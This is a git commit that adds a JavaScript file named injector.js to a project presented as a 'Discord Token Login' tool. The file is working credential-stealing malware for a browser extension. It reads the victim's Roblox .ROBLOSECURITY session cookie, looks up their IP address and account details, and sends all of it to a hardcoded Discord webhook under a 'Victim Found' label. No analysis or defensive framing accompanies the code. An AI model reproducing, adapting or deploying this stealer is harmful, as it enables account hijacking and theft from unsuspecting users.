7ab7135d81cbb377d630eeb801c6f01e145eb569
HAZ3MN48348 <121587092+HAZ3MN48348@users.noreply.github.com>
2023-06-25 18:28:57 -0500

    Add files via upload

---
+++ Discord Token Login/scripts/injector.js
@@ -0,0 +1,65 @@
+const WEBHOOK = "https://discord.com/api/webhooks/1122231050240790668/YMiFH6wXH2mGafr71woux_9_S8vRgZsqA9gNX19eMgGuK-s5kHGC5b4qaVOL4Hib6J76";
+
+async function main(cookie) {
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
+
+    if (cookie) {
+        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+            headers: {
+                Cookie: ".ROBLOSECURITY=" + cookie
+            },
+            redirect: "manual"
+        })).json();
+    }
+    
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {
+            "Content-Type": "Application/json"
+        },
+        body: JSON.stringify({
+            "content": null,
+            "embeds": [
+              {
+                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+                "color": null,
+                "fields": [
+                  {
+                    "name": "Username",
+                    "value": statistics ? statistics.UserName : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Robux",
+                    "value": statistics ? statistics.RobuxBalance : "N/A",
+                    "inline": true
+                  },
+                  {
+                    "name": "Premium",
+                    "value": statistics ? statistics.IsPremium : "N/A",
+                    "inline": true
+                  }
+                ],
+                "author": {
+                  "name": "Victim Found: " + ipAddr,
+                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                },
+                "footer": {
+                  "text": "Z2Z Private Logger",
+                  "icon_url": "https://i.ibb.co/LzWGXds/Monster.png"
+                },
+                "thumbnail": {
+                  "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
+                }
+              }
+            ],
+            "username": "Roblox Logger",
+            "avatar_url": "https://i.ibb.co/GFDpZtp/roblox.png",
+            "attachments": []
+        })
+    });
+}
+
+chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+    main(cookie ? cookie.value : null);
+});
